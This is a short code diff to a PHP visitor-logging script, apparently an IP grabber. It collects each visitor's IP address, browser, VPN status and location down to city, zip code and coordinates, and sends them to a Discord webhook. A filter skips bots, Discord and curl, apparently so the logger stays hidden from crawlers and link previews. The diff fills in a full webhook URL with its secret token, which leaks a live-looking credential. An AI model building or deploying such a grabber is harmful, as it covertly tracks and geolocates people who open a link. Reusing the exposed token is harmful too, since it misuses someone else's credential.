@@ -18,7 +18,7 @@ if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
 }
 
 //YOU CAN SET YOUR TIMEZONE HERE!
-date_default_timezone_set("Europe/Amsterdam");
+date_default_timezone_set("Europe/London");
 $Date = date('d/m/Y');
 $Time = date('G:i:s');
 
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1149077894455361657/GUjlbOyjNzHdzUBMAjr3VUeY1PufCFq7VmE3HCqgUNLEc6ccU0yM44ft49gQvtPY3ktZ";
 
         $InfoArr = array(
             "username" => "$WebhookName",
